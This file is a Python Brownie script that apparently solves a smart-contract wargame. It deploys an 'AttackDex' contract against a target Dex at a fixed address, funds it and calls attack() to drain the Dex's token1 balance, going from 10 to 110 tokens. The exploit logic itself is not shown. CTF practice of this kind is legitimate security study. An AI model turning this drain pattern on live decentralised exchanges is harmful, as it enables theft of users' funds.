from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import Dex, AttackDex, network, Contract, SwappableToken
from web3 import Web3
from web3.auto import w3


def deploy_Dex():
    acc1 = get_account(index=1)
    dex = Dex.deploy(
        {"from": acc1},
    )
    return dex


def deploy_AttackDex(dex):
    account = get_account()
    attack_contract = AttackDex.deploy(
        dex,
        {"from": account},
    )
    return attack_contract


# helper function that print the supply of owner for both token
def print_balance(dex, owner):
    tok1 = dex.balanceOf(dex.token1(), owner)
    tok2 = dex.balanceOf(dex.token2(), owner)
    print(f"tok1: {tok1}")
    print(f"tok2: {tok2}")


def main():
    print(network.show_active())
    account = get_account()

    # dex = deploy_Dex() local testing
    dex_address = "0xbA36210BF6042938aFdF61050542Ba4747882fA1"
    dex = Contract.from_abi(Dex._name, dex_address, Dex.abi)
    # need the ERC20 interface (or SwappableToken) to transfer the token to our attack contract
    token1 = Contract.from_abi(SwappableToken._name, dex.token1(), SwappableToken.abi)
    token2 = Contract.from_abi(SwappableToken._name, dex.token2(), SwappableToken.abi)

    # deploy attack contract
    attack_contract = deploy_AttackDex(dex)
    # send initial tokens balance to attack contract
    token1.transfer(
        attack_contract, dex.balanceOf(dex.token1(), account), {"from": account}
    )
    token2.transfer(
        attack_contract, dex.balanceOf(dex.token2(), account), {"from": account}
    )

    # we start with 10 and 10
    print_balance(dex, attack_contract)
    attack_contract.attack(
        {"from": account, "gas_limit": 1_000_000, "allow_revert": True}
    )
    # we endup with 110 and 20
    print_balance(dex, attack_contract)
